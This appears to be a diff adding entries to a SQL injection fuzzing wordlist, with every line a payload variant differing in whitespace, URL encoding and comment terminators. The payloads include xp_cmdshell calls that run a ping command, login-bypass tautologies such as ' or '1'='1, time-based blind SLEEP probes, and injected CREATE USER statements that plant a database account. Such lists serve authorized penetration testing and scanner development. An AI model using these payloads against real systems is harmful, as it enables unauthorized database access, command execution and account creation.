+';/**/exec/**/master..xp_cmdshell/**/'ping/**/10.10.1.2'---- 
+';/**/EXEC/**/MASTER..XP_CMDSHELL/**/'PING/**/10.10.1.2'---- 
+';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'--
+';%20EXEC%20MASTER..XP_CMDSHELL%20'PING%2010.10.1.2'--
+';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'-- -- 
+';%20EXEC%20MASTER..XP_CMDSHELL%20'PING%2010.10.1.2'-- -- 
+';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'-- -- -
+';%20EXEC%20MASTER..XP_CMDSHELL%20'PING%2010.10.1.2'-- -- -
+';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'-- --+
+';%20EXEC%20MASTER..XP_CMDSHELL%20'PING%2010.10.1.2'-- --+
+';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'-- #
+';%20EXEC%20MASTER..XP_CMDSHELL%20'PING%2010.10.1.2'-- #
+';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'--/*
+';%20EXEC%20MASTER..XP_CMDSHELL%20'PING%2010.10.1.2'--/*
+';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'-- %23
+';%20EXEC%20MASTER..XP_CMDSHELL%20'PING%2010.10.1.2'-- %23
+';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'---- 
+';%20EXEC%20MASTER..XP_CMDSHELL%20'PING%2010.10.1.2'---- 
+';+exec+master..xp_cmdshell+'ping+10.10.1.2'--
+';+EXEC+MASTER..XP_CMDSHELL+'PING+10.10.1.2'--
+';+exec+master..xp_cmdshell+'ping+10.10.1.2'-- -- 
+';+EXEC+MASTER..XP_CMDSHELL+'PING+10.10.1.2'-- -- 
+';+exec+master..xp_cmdshell+'ping+10.10.1.2'-- -- -
+';+EXEC+MASTER..XP_CMDSHELL+'PING+10.10.1.2'-- -- -
+';+exec+master..xp_cmdshell+'ping+10.10.1.2'-- --+
+';+EXEC+MASTER..XP_CMDSHELL+'PING+10.10.1.2'-- --+
+';+exec+master..xp_cmdshell+'ping+10.10.1.2'-- #
+';+EXEC+MASTER..XP_CMDSHELL+'PING+10.10.1.2'-- #
+';+exec+master..xp_cmdshell+'ping+10.10.1.2'--/*
+';+EXEC+MASTER..XP_CMDSHELL+'PING+10.10.1.2'--/*
+';+exec+master..xp_cmdshell+'ping+10.10.1.2'-- %23
+';+EXEC+MASTER..XP_CMDSHELL+'PING+10.10.1.2'-- %23
+';+exec+master..xp_cmdshell+'ping+10.10.1.2'---- 
+';+EXEC+MASTER..XP_CMDSHELL+'PING+10.10.1.2'---- 
+';\texec\tmaster..xp_cmdshell\t'ping\t10.10.1.2'--
+';\tEXEC\tMASTER..XP_CMDSHELL\t'PING\t10.10.1.2'--
+';\texec\tmaster..xp_cmdshell\t'ping\t10.10.1.2'-- -- 
+';\tEXEC\tMASTER..XP_CMDSHELL\t'PING\t10.10.1.2'-- -- 
+';\texec\tmaster..xp_cmdshell\t'ping\t10.10.1.2'-- -- -
+';\tEXEC\tMASTER..XP_CMDSHELL\t'PING\t10.10.1.2'-- -- -
+';\texec\tmaster..xp_cmdshell\t'ping\t10.10.1.2'-- --+
+';\tEXEC\tMASTER..XP_CMDSHELL\t'PING\t10.10.1.2'-- --+
+';\texec\tmaster..xp_cmdshell\t'ping\t10.10.1.2'-- #
+';\tEXEC\tMASTER..XP_CMDSHELL\t'PING\t10.10.1.2'-- #
+';\texec\tmaster..xp_cmdshell\t'ping\t10.10.1.2'--/*
+';\tEXEC\tMASTER..XP_CMDSHELL\t'PING\t10.10.1.2'--/*
+';\texec\tmaster..xp_cmdshell\t'ping\t10.10.1.2'-- %23
+';\tEXEC\tMASTER..XP_CMDSHELL\t'PING\t10.10.1.2'-- %23
+';\texec\tmaster..xp_cmdshell\t'ping\t10.10.1.2'---- 
+';\tEXEC\tMASTER..XP_CMDSHELL\t'PING\t10.10.1.2'---- 
+'-'
+'-' -- 
+'-' -- -
+'-' --+
+'-' #
+'-'/*
+'-' %23
+'-'-- 
+1'1
+1'1 -- 
+1'1 -- -
+1'1 --+
+1'1 #
+1'1/*
+1'1 %23
+1'1-- 
+SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/
+sleep(1) /*' or sleep(1) or '\" or sleep(1) or \"*/
+SLEEP(1) /*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*/
+SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/ -- 
+sleep(1) /*' or sleep(1) or '\" or sleep(1) or \"*/ -- 
+SLEEP(1) /*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*/ -- 
+SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/ -- -
+sleep(1) /*' or sleep(1) or '\" or sleep(1) or \"*/ -- -
+SLEEP(1) /*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*/ -- -
+SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/ --+
+sleep(1) /*' or sleep(1) or '\" or sleep(1) or \"*/ --+
+SLEEP(1) /*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*/ --+
+SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/ #
+sleep(1) /*' or sleep(1) or '\" or sleep(1) or \"*/ #
+SLEEP(1) /*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*/ #
+SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*//*
+sleep(1) /*' or sleep(1) or '\" or sleep(1) or \"*//*
+SLEEP(1) /*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*//*
+SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/ %23
+sleep(1) /*' or sleep(1) or '\" or sleep(1) or \"*/ %23
+SLEEP(1) /*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*/ %23
+SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/-- 
+sleep(1) /*' or sleep(1) or '\" or sleep(1) or \"*/-- 
+SLEEP(1) /*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*/-- 
+SLEEP(1)/**//*'/**/or/**/SLEEP(1)/**/or/**/'\"/**/or/**/SLEEP(1)/**/or/**/\"*/
+sleep(1)/**//*'/**/or/**/sleep(1)/**/or/**/'\"/**/or/**/sleep(1)/**/or/**/\"*/
+SLEEP(1)/**//*'/**/OR/**/SLEEP(1)/**/OR/**/'\"/**/OR/**/SLEEP(1)/**/OR/**/\"*/
+SLEEP(1)/**//*'/**/or/**/SLEEP(1)/**/or/**/'\"/**/or/**/SLEEP(1)/**/or/**/\"*/ -- 
+sleep(1)/**//*'/**/or/**/sleep(1)/**/or/**/'\"/**/or/**/sleep(1)/**/or/**/\"*/ -- 
+SLEEP(1)/**//*'/**/OR/**/SLEEP(1)/**/OR/**/'\"/**/OR/**/SLEEP(1)/**/OR/**/\"*/ -- 
+SLEEP(1)/**//*'/**/or/**/SLEEP(1)/**/or/**/'\"/**/or/**/SLEEP(1)/**/or/**/\"*/ -- -
+sleep(1)/**//*'/**/or/**/sleep(1)/**/or/**/'\"/**/or/**/sleep(1)/**/or/**/\"*/ -- -
+SLEEP(1)/**//*'/**/OR/**/SLEEP(1)/**/OR/**/'\"/**/OR/**/SLEEP(1)/**/OR/**/\"*/ -- -
+SLEEP(1)/**//*'/**/or/**/SLEEP(1)/**/or/**/'\"/**/or/**/SLEEP(1)/**/or/**/\"*/ --+
+sleep(1)/**//*'/**/or/**/sleep(1)/**/or/**/'\"/**/or/**/sleep(1)/**/or/**/\"*/ --+
+SLEEP(1)/**//*'/**/OR/**/SLEEP(1)/**/OR/**/'\"/**/OR/**/SLEEP(1)/**/OR/**/\"*/ --+
+SLEEP(1)/**//*'/**/or/**/SLEEP(1)/**/or/**/'\"/**/or/**/SLEEP(1)/**/or/**/\"*/ #
+sleep(1)/**//*'/**/or/**/sleep(1)/**/or/**/'\"/**/or/**/sleep(1)/**/or/**/\"*/ #
+SLEEP(1)/**//*'/**/OR/**/SLEEP(1)/**/OR/**/'\"/**/OR/**/SLEEP(1)/**/OR/**/\"*/ #
+SLEEP(1)/**//*'/**/or/**/SLEEP(1)/**/or/**/'\"/**/or/**/SLEEP(1)/**/or/**/\"*//*
+sleep(1)/**//*'/**/or/**/sleep(1)/**/or/**/'\"/**/or/**/sleep(1)/**/or/**/\"*//*
+SLEEP(1)/**//*'/**/OR/**/SLEEP(1)/**/OR/**/'\"/**/OR/**/SLEEP(1)/**/OR/**/\"*//*
+SLEEP(1)/**//*'/**/or/**/SLEEP(1)/**/or/**/'\"/**/or/**/SLEEP(1)/**/or/**/\"*/ %23
+sleep(1)/**//*'/**/or/**/sleep(1)/**/or/**/'\"/**/or/**/sleep(1)/**/or/**/\"*/ %23
+SLEEP(1)/**//*'/**/OR/**/SLEEP(1)/**/OR/**/'\"/**/OR/**/SLEEP(1)/**/OR/**/\"*/ %23
+SLEEP(1)/**//*'/**/or/**/SLEEP(1)/**/or/**/'\"/**/or/**/SLEEP(1)/**/or/**/\"*/-- 
+sleep(1)/**//*'/**/or/**/sleep(1)/**/or/**/'\"/**/or/**/sleep(1)/**/or/**/\"*/-- 
+SLEEP(1)/**//*'/**/OR/**/SLEEP(1)/**/OR/**/'\"/**/OR/**/SLEEP(1)/**/OR/**/\"*/-- 
+SLEEP(1)%20/*'%20or%20SLEEP(1)%20or%20'\"%20or%20SLEEP(1)%20or%20\"*/
+sleep(1)%20/*'%20or%20sleep(1)%20or%20'\"%20or%20sleep(1)%20or%20\"*/
+SLEEP(1)%20/*'%20OR%20SLEEP(1)%20OR%20'\"%20OR%20SLEEP(1)%20OR%20\"*/
+SLEEP(1)%20/*'%20or%20SLEEP(1)%20or%20'\"%20or%20SLEEP(1)%20or%20\"*/ -- 
+sleep(1)%20/*'%20or%20sleep(1)%20or%20'\"%20or%20sleep(1)%20or%20\"*/ -- 
+SLEEP(1)%20/*'%20OR%20SLEEP(1)%20OR%20'\"%20OR%20SLEEP(1)%20OR%20\"*/ -- 
+SLEEP(1)%20/*'%20or%20SLEEP(1)%20or%20'\"%20or%20SLEEP(1)%20or%20\"*/ -- -
+sleep(1)%20/*'%20or%20sleep(1)%20or%20'\"%20or%20sleep(1)%20or%20\"*/ -- -
+SLEEP(1)%20/*'%20OR%20SLEEP(1)%20OR%20'\"%20OR%20SLEEP(1)%20OR%20\"*/ -- -
+SLEEP(1)%20/*'%20or%20SLEEP(1)%20or%20'\"%20or%20SLEEP(1)%20or%20\"*/ --+
+sleep(1)%20/*'%20or%20sleep(1)%20or%20'\"%20or%20sleep(1)%20or%20\"*/ --+
+SLEEP(1)%20/*'%20OR%20SLEEP(1)%20OR%20'\"%20OR%20SLEEP(1)%20OR%20\"*/ --+
+SLEEP(1)%20/*'%20or%20SLEEP(1)%20or%20'\"%20or%20SLEEP(1)%20or%20\"*/ #
+sleep(1)%20/*'%20or%20sleep(1)%20or%20'\"%20or%20sleep(1)%20or%20\"*/ #
+SLEEP(1)%20/*'%20OR%20SLEEP(1)%20OR%20'\"%20OR%20SLEEP(1)%20OR%20\"*/ #
+SLEEP(1)%20/*'%20or%20SLEEP(1)%20or%20'\"%20or%20SLEEP(1)%20or%20\"*//*
+sleep(1)%20/*'%20or%20sleep(1)%20or%20'\"%20or%20sleep(1)%20or%20\"*//*
+SLEEP(1)%20/*'%20OR%20SLEEP(1)%20OR%20'\"%20OR%20SLEEP(1)%20OR%20\"*//*
+SLEEP(1)%20/*'%20or%20SLEEP(1)%20or%20'\"%20or%20SLEEP(1)%20or%20\"*/ %23
+sleep(1)%20/*'%20or%20sleep(1)%20or%20'\"%20or%20sleep(1)%20or%20\"*/ %23
+SLEEP(1)%20/*'%20OR%20SLEEP(1)%20OR%20'\"%20OR%20SLEEP(1)%20OR%20\"*/ %23
+SLEEP(1)%20/*'%20or%20SLEEP(1)%20or%20'\"%20or%20SLEEP(1)%20or%20\"*/-- 
+sleep(1)%20/*'%20or%20sleep(1)%20or%20'\"%20or%20sleep(1)%20or%20\"*/-- 
+SLEEP(1)%20/*'%20OR%20SLEEP(1)%20OR%20'\"%20OR%20SLEEP(1)%20OR%20\"*/-- 
+SLEEP(1)+/*'+or+SLEEP(1)+or+'\"+or+SLEEP(1)+or+\"*/
+sleep(1)+/*'+or+sleep(1)+or+'\"+or+sleep(1)+or+\"*/
+SLEEP(1)+/*'+OR+SLEEP(1)+OR+'\"+OR+SLEEP(1)+OR+\"*/
+SLEEP(1)+/*'+or+SLEEP(1)+or+'\"+or+SLEEP(1)+or+\"*/ -- 
+sleep(1)+/*'+or+sleep(1)+or+'\"+or+sleep(1)+or+\"*/ -- 
+SLEEP(1)+/*'+OR+SLEEP(1)+OR+'\"+OR+SLEEP(1)+OR+\"*/ -- 
+SLEEP(1)+/*'+or+SLEEP(1)+or+'\"+or+SLEEP(1)+or+\"*/ -- -
+sleep(1)+/*'+or+sleep(1)+or+'\"+or+sleep(1)+or+\"*/ -- -
+SLEEP(1)+/*'+OR+SLEEP(1)+OR+'\"+OR+SLEEP(1)+OR+\"*/ -- -
+SLEEP(1)+/*'+or+SLEEP(1)+or+'\"+or+SLEEP(1)+or+\"*/ --+
+sleep(1)+/*'+or+sleep(1)+or+'\"+or+sleep(1)+or+\"*/ --+
+SLEEP(1)+/*'+OR+SLEEP(1)+OR+'\"+OR+SLEEP(1)+OR+\"*/ --+
+SLEEP(1)+/*'+or+SLEEP(1)+or+'\"+or+SLEEP(1)+or+\"*/ #
+sleep(1)+/*'+or+sleep(1)+or+'\"+or+sleep(1)+or+\"*/ #
+SLEEP(1)+/*'+OR+SLEEP(1)+OR+'\"+OR+SLEEP(1)+OR+\"*/ #
+SLEEP(1)+/*'+or+SLEEP(1)+or+'\"+or+SLEEP(1)+or+\"*//*
+sleep(1)+/*'+or+sleep(1)+or+'\"+or+sleep(1)+or+\"*//*
+SLEEP(1)+/*'+OR+SLEEP(1)+OR+'\"+OR+SLEEP(1)+OR+\"*//*
+SLEEP(1)+/*'+or+SLEEP(1)+or+'\"+or+SLEEP(1)+or+\"*/ %23
+sleep(1)+/*'+or+sleep(1)+or+'\"+or+sleep(1)+or+\"*/ %23
+SLEEP(1)+/*'+OR+SLEEP(1)+OR+'\"+OR+SLEEP(1)+OR+\"*/ %23
+SLEEP(1)+/*'+or+SLEEP(1)+or+'\"+or+SLEEP(1)+or+\"*/-- 
+sleep(1)+/*'+or+sleep(1)+or+'\"+or+sleep(1)+or+\"*/-- 
+SLEEP(1)+/*'+OR+SLEEP(1)+OR+'\"+OR+SLEEP(1)+OR+\"*/-- 
+SLEEP(1)\t/*'\tor\tSLEEP(1)\tor\t'\"\tor\tSLEEP(1)\tor\t\"*/
+sleep(1)\t/*'\tor\tsleep(1)\tor\t'\"\tor\tsleep(1)\tor\t\"*/
+SLEEP(1)\t/*'\tOR\tSLEEP(1)\tOR\t'\"\tOR\tSLEEP(1)\tOR\t\"*/
+SLEEP(1)\t/*'\tor\tSLEEP(1)\tor\t'\"\tor\tSLEEP(1)\tor\t\"*/ -- 
+sleep(1)\t/*'\tor\tsleep(1)\tor\t'\"\tor\tsleep(1)\tor\t\"*/ -- 
+SLEEP(1)\t/*'\tOR\tSLEEP(1)\tOR\t'\"\tOR\tSLEEP(1)\tOR\t\"*/ -- 
+SLEEP(1)\t/*'\tor\tSLEEP(1)\tor\t'\"\tor\tSLEEP(1)\tor\t\"*/ -- -
+sleep(1)\t/*'\tor\tsleep(1)\tor\t'\"\tor\tsleep(1)\tor\t\"*/ -- -
+SLEEP(1)\t/*'\tOR\tSLEEP(1)\tOR\t'\"\tOR\tSLEEP(1)\tOR\t\"*/ -- -
+SLEEP(1)\t/*'\tor\tSLEEP(1)\tor\t'\"\tor\tSLEEP(1)\tor\t\"*/ --+
+sleep(1)\t/*'\tor\tsleep(1)\tor\t'\"\tor\tsleep(1)\tor\t\"*/ --+
+SLEEP(1)\t/*'\tOR\tSLEEP(1)\tOR\t'\"\tOR\tSLEEP(1)\tOR\t\"*/ --+
+SLEEP(1)\t/*'\tor\tSLEEP(1)\tor\t'\"\tor\tSLEEP(1)\tor\t\"*/ #
+sleep(1)\t/*'\tor\tsleep(1)\tor\t'\"\tor\tsleep(1)\tor\t\"*/ #
+SLEEP(1)\t/*'\tOR\tSLEEP(1)\tOR\t'\"\tOR\tSLEEP(1)\tOR\t\"*/ #
+SLEEP(1)\t/*'\tor\tSLEEP(1)\tor\t'\"\tor\tSLEEP(1)\tor\t\"*//*
+sleep(1)\t/*'\tor\tsleep(1)\tor\t'\"\tor\tsleep(1)\tor\t\"*//*
+SLEEP(1)\t/*'\tOR\tSLEEP(1)\tOR\t'\"\tOR\tSLEEP(1)\tOR\t\"*//*
+SLEEP(1)\t/*'\tor\tSLEEP(1)\tor\t'\"\tor\tSLEEP(1)\tor\t\"*/ %23
+sleep(1)\t/*'\tor\tsleep(1)\tor\t'\"\tor\tsleep(1)\tor\t\"*/ %23
+SLEEP(1)\t/*'\tOR\tSLEEP(1)\tOR\t'\"\tOR\tSLEEP(1)\tOR\t\"*/ %23
+SLEEP(1)\t/*'\tor\tSLEEP(1)\tor\t'\"\tor\tSLEEP(1)\tor\t\"*/-- 
+sleep(1)\t/*'\tor\tsleep(1)\tor\t'\"\tor\tsleep(1)\tor\t\"*/-- 
+SLEEP(1)\t/*'\tOR\tSLEEP(1)\tOR\t'\"\tOR\tSLEEP(1)\tOR\t\"*/-- 
+\" or 1=1#
+\" OR 1=1#
+\" or 1=1# -- 
+\" OR 1=1# -- 
+\" or 1=1# -- -
+\" OR 1=1# -- -
+\" or 1=1# --+
+\" OR 1=1# --+
+\" or 1=1# #
+\" OR 1=1# #
+\" or 1=1#/*
+\" OR 1=1#/*
+\" or 1=1# %23
+\" OR 1=1# %23
+\" or 1=1#-- 
+\" OR 1=1#-- 
+\"/**/or/**/1=1#
+\"/**/OR/**/1=1#
+\"/**/or/**/1=1# -- 
+\"/**/OR/**/1=1# -- 
+\"/**/or/**/1=1# -- -
+\"/**/OR/**/1=1# -- -
+\"/**/or/**/1=1# --+
+\"/**/OR/**/1=1# --+
+\"/**/or/**/1=1# #
+\"/**/OR/**/1=1# #
+\"/**/or/**/1=1#/*
+\"/**/OR/**/1=1#/*
+\"/**/or/**/1=1# %23
+\"/**/OR/**/1=1# %23
+\"/**/or/**/1=1#-- 
+\"/**/OR/**/1=1#-- 
+\"%20or%201=1#
+\"%20OR%201=1#
+\"%20or%201=1# -- 
+\"%20OR%201=1# -- 
+\"%20or%201=1# -- -
+\"%20OR%201=1# -- -
+\"%20or%201=1# --+
+\"%20OR%201=1# --+
+\"%20or%201=1# #
+\"%20OR%201=1# #
+\"%20or%201=1#/*
+\"%20OR%201=1#/*
+\"%20or%201=1# %23
+\"%20OR%201=1# %23
+\"%20or%201=1#-- 
+\"%20OR%201=1#-- 
+\"+or+1=1#
+\"+OR+1=1#
+\"+or+1=1# -- 
+\"+OR+1=1# -- 
+\"+or+1=1# -- -
+\"+OR+1=1# -- -
+\"+or+1=1# --+
+\"+OR+1=1# --+
+\"+or+1=1# #
+\"+OR+1=1# #
+\"+or+1=1#/*
+\"+OR+1=1#/*
+\"+or+1=1# %23
+\"+OR+1=1# %23
+\"+or+1=1#-- 
+\"+OR+1=1#-- 
+\"\tor\t1=1#
+\"\tOR\t1=1#
+\"\tor\t1=1# -- 
+\"\tOR\t1=1# -- 
+\"\tor\t1=1# -- -
+\"\tOR\t1=1# -- -
+\"\tor\t1=1# --+
+\"\tOR\t1=1# --+
+\"\tor\t1=1# #
+\"\tOR\t1=1# #
+\"\tor\t1=1#/*
+\"\tOR\t1=1#/*
+\"\tor\t1=1# %23
+\"\tOR\t1=1# %23
+\"\tor\t1=1#-- 
+\"\tOR\t1=1#-- 
+%20or%201=1
+%20OR%201=1
+%20or%201=1 -- 
+%20OR%201=1 -- 
+%20or%201=1 -- -
+%20OR%201=1 -- -
+%20or%201=1 --+
+%20OR%201=1 --+
+%20or%201=1 #
+%20OR%201=1 #
+%20or%201=1/*
+%20OR%201=1/*
+%20or%201=1 %23
+%20OR%201=1 %23
+%20or%201=1-- 
+%20OR%201=1-- 
+' or '1'='1
+' OR '1'='1
+' or '1'='1 -- 
+' OR '1'='1 -- 
+' or '1'='1 -- -
+' OR '1'='1 -- -
+' or '1'='1 --+
+' OR '1'='1 --+
+' or '1'='1 #
+' OR '1'='1 #
+' or '1'='1/*
+' OR '1'='1/*
+' or '1'='1 %23
+' OR '1'='1 %23
+' or '1'='1-- 
+' OR '1'='1-- 
+'/**/or/**/'1'='1
+'/**/OR/**/'1'='1
+'/**/or/**/'1'='1 -- 
+'/**/OR/**/'1'='1 -- 
+'/**/or/**/'1'='1 -- -
+'/**/OR/**/'1'='1 -- -
+'/**/or/**/'1'='1 --+
+'/**/OR/**/'1'='1 --+
+'/**/or/**/'1'='1 #
+'/**/OR/**/'1'='1 #
+'/**/or/**/'1'='1/*
+'/**/OR/**/'1'='1/*
+'/**/or/**/'1'='1 %23
+'/**/OR/**/'1'='1 %23
+'/**/or/**/'1'='1-- 
+'/**/OR/**/'1'='1-- 
+'%20or%20'1'='1
+'%20OR%20'1'='1
+'%20or%20'1'='1 -- 
+'%20OR%20'1'='1 -- 
+'%20or%20'1'='1 -- -
+'%20OR%20'1'='1 -- -
+'%20or%20'1'='1 --+
+'%20OR%20'1'='1 --+
+'%20or%20'1'='1 #
+'%20OR%20'1'='1 #
+'%20or%20'1'='1/*
+'%20OR%20'1'='1/*
+'%20or%20'1'='1 %23
+'%20OR%20'1'='1 %23
+'%20or%20'1'='1-- 
+'%20OR%20'1'='1-- 
+'+or+'1'='1
+'+OR+'1'='1
+'+or+'1'='1 -- 
+'+OR+'1'='1 -- 
+'+or+'1'='1 -- -
+'+OR+'1'='1 -- -
+'+or+'1'='1 --+
+'+OR+'1'='1 --+
+'+or+'1'='1 #
+'+OR+'1'='1 #
+'+or+'1'='1/*
+'+OR+'1'='1/*
+'+or+'1'='1 %23
+'+OR+'1'='1 %23
+'+or+'1'='1-- 
+'+OR+'1'='1-- 
+'\tor\t'1'='1
+'\tOR\t'1'='1
+'\tor\t'1'='1 -- 
+'\tOR\t'1'='1 -- 
+'\tor\t'1'='1 -- -
+'\tOR\t'1'='1 -- -
+'\tor\t'1'='1 --+
+'\tOR\t'1'='1 --+
+'\tor\t'1'='1 #
+'\tOR\t'1'='1 #
+'\tor\t'1'='1/*
+'\tOR\t'1'='1/*
+'\tor\t'1'='1 %23
+'\tOR\t'1'='1 %23
+'\tor\t'1'='1-- 
+'\tOR\t'1'='1-- 
+1 or sleep(5)#
+1 OR SLEEP(5)#
+1 or sleep(5)# -- 
+1 OR SLEEP(5)# -- 
+1 or sleep(5)# -- -
+1 OR SLEEP(5)# -- -
+1 or sleep(5)# --+
+1 OR SLEEP(5)# --+
+1 or sleep(5)# #
+1 OR SLEEP(5)# #
+1 or sleep(5)#/*
+1 OR SLEEP(5)#/*
+1 or sleep(5)# %23
+1 OR SLEEP(5)# %23
+1 or sleep(5)#-- 
+1 OR SLEEP(5)#-- 
+1/**/or/**/sleep(5)#
+1/**/OR/**/SLEEP(5)#
+1/**/or/**/sleep(5)# -- 
+1/**/OR/**/SLEEP(5)# -- 
+1/**/or/**/sleep(5)# -- -
+1/**/OR/**/SLEEP(5)# -- -
+1/**/or/**/sleep(5)# --+
+1/**/OR/**/SLEEP(5)# --+
+1/**/or/**/sleep(5)# #
+1/**/OR/**/SLEEP(5)# #
+1/**/or/**/sleep(5)#/*
+1/**/OR/**/SLEEP(5)#/*
+1/**/or/**/sleep(5)# %23
+1/**/OR/**/SLEEP(5)# %23
+1/**/or/**/sleep(5)#-- 
+1/**/OR/**/SLEEP(5)#-- 
+1%20or%20sleep(5)#
+1%20OR%20SLEEP(5)#
+1%20or%20sleep(5)# -- 
+1%20OR%20SLEEP(5)# -- 
+1%20or%20sleep(5)# -- -
+1%20OR%20SLEEP(5)# -- -
+1%20or%20sleep(5)# --+
+1%20OR%20SLEEP(5)# --+
+1%20or%20sleep(5)# #
+1%20OR%20SLEEP(5)# #
+1%20or%20sleep(5)#/*
+1%20OR%20SLEEP(5)#/*
+1%20or%20sleep(5)# %23
+1%20OR%20SLEEP(5)# %23
+1%20or%20sleep(5)#-- 
+1%20OR%20SLEEP(5)#-- 
+1+or+sleep(5)#
+1+OR+SLEEP(5)#
+1+or+sleep(5)# -- 
+1+OR+SLEEP(5)# -- 
+1+or+sleep(5)# -- -
+1+OR+SLEEP(5)# -- -
+1+or+sleep(5)# --+
+1+OR+SLEEP(5)# --+
+1+or+sleep(5)# #
+1+OR+SLEEP(5)# #
+1+or+sleep(5)#/*
+1+OR+SLEEP(5)#/*
+1+or+sleep(5)# %23
+1+OR+SLEEP(5)# %23
+1+or+sleep(5)#-- 
+1+OR+SLEEP(5)#-- 
+1\tor\tsleep(5)#
+1\tOR\tSLEEP(5)#
+1\tor\tsleep(5)# -- 
+1\tOR\tSLEEP(5)# -- 
+1\tor\tsleep(5)# -- -
+1\tOR\tSLEEP(5)# -- -
+1\tor\tsleep(5)# --+
+1\tOR\tSLEEP(5)# --+
+1\tor\tsleep(5)# #
+1\tOR\tSLEEP(5)# #
+1\tor\tsleep(5)#/*
+1\tOR\tSLEEP(5)#/*
+1\tor\tsleep(5)# %23
+1\tOR\tSLEEP(5)# %23
+1\tor\tsleep(5)#-- 
+1\tOR\tSLEEP(5)#-- 
+'OR '' = '
+'or '' = '
+'OR '' = ' -- 
+'or '' = ' -- 
+'OR '' = ' -- -
+'or '' = ' -- -
+'OR '' = ' --+
+'or '' = ' --+
+'OR '' = ' #
+'or '' = ' #
+'OR '' = '/*
+'or '' = '/*
+'OR '' = ' %23
+'or '' = ' %23
+'OR '' = '-- 
+'or '' = '-- 
+'OR/**/''/**/=/**/'
+'or/**/''/**/=/**/'
+'OR/**/''/**/=/**/' -- 
+'or/**/''/**/=/**/' -- 
+'OR/**/''/**/=/**/' -- -
+'or/**/''/**/=/**/' -- -
+'OR/**/''/**/=/**/' --+
+'or/**/''/**/=/**/' --+
+'OR/**/''/**/=/**/' #
+'or/**/''/**/=/**/' #
+'OR/**/''/**/=/**/'/*
+'or/**/''/**/=/**/'/*
+'OR/**/''/**/=/**/' %23
+'or/**/''/**/=/**/' %23
+'OR/**/''/**/=/**/'-- 
+'or/**/''/**/=/**/'-- 
+'OR%20''%20=%20'
+'or%20''%20=%20'
+'OR%20''%20=%20' -- 
+'or%20''%20=%20' -- 
+'OR%20''%20=%20' -- -
+'or%20''%20=%20' -- -
+'OR%20''%20=%20' --+
+'or%20''%20=%20' --+
+'OR%20''%20=%20' #
+'or%20''%20=%20' #
+'OR%20''%20=%20'/*
+'or%20''%20=%20'/*
+'OR%20''%20=%20' %23
+'or%20''%20=%20' %23
+'OR%20''%20=%20'-- 
+'or%20''%20=%20'-- 
+'OR+''+=+'
+'or+''+=+'
+'OR+''+=+' -- 
+'or+''+=+' -- 
+'OR+''+=+' -- -
+'or+''+=+' -- -
+'OR+''+=+' --+
+'or+''+=+' --+
+'OR+''+=+' #
+'or+''+=+' #
+'OR+''+=+'/*
+'or+''+=+'/*
+'OR+''+=+' %23
+'or+''+=+' %23
+'OR+''+=+'-- 
+'or+''+=+'-- 
+'OR\t''\t=\t'
+'or\t''\t=\t'
+'OR\t''\t=\t' -- 
+'or\t''\t=\t' -- 
+'OR\t''\t=\t' -- -
+'or\t''\t=\t' -- -
+'OR\t''\t=\t' --+
+'or\t''\t=\t' --+
+'OR\t''\t=\t' #
+'or\t''\t=\t' #
+'OR\t''\t=\t'/*
+'or\t''\t=\t'/*
+'OR\t''\t=\t' %23
+'or\t''\t=\t' %23
+'OR\t''\t=\t'-- 
+'or\t''\t=\t'-- 
+'create user name identified by 'pass123' --
+'CREATE USER NAME IDENTIFIED BY 'PASS123' --
+'create user name identified by 'pass123' -- -- 
+'CREATE USER NAME IDENTIFIED BY 'PASS123' -- -- 
+'create user name identified by 'pass123' -- -- -
+'CREATE USER NAME IDENTIFIED BY 'PASS123' -- -- -
+'create user name identified by 'pass123' -- --+
+'CREATE USER NAME IDENTIFIED BY 'PASS123' -- --+
+'create user name identified by 'pass123' -- #
+'CREATE USER NAME IDENTIFIED BY 'PASS123' -- #
+'create user name identified by 'pass123' --/*
+'CREATE USER NAME IDENTIFIED BY 'PASS123' --/*
+'create user name identified by 'pass123' -- %23
+'CREATE USER NAME IDENTIFIED BY 'PASS123' -- %23
+'create user name identified by 'pass123' ---- 
+'CREATE USER NAME IDENTIFIED BY 'PASS123' ---- 
+'create/**/user/**/name/**/identified/**/by/**/'pass123'/**/--
+'CREATE/**/USER/**/NAME/**/IDENTIFIED/**/BY/**/'PASS123'/**/--
+'create/**/user/**/name/**/identified/**/by/**/'pass123'/**/-- -- 
+'CREATE/**/USER/**/NAME/**/IDENTIFIED/**/BY/**/'PASS123'/**/-- -- 
+'create/**/user/**/name/**/identified/**/by/**/'pass123'/**/-- -- -
+'CREATE/**/USER/**/NAME/**/IDENTIFIED/**/BY/**/'PASS123'/**/-- -- -
+'create/**/user/**/name/**/identified/**/by/**/'pass123'/**/-- --+
+'CREATE/**/USER/**/NAME/**/IDENTIFIED/**/BY/**/'PASS123'/**/-- --+
+'create/**/user/**/name/**/identified/**/by/**/'pass123'/**/-- #
+'CREATE/**/USER/**/NAME/**/IDENTIFIED/**/BY/**/'PASS123'/**/-- #
+'create/**/user/**/name/**/identified/**/by/**/'pass123'/**/--/*
+'CREATE/**/USER/**/NAME/**/IDENTIFIED/**/BY/**/'PASS123'/**/--/*
+'create/**/user/**/name/**/identified/**/by/**/'pass123'/**/-- %23
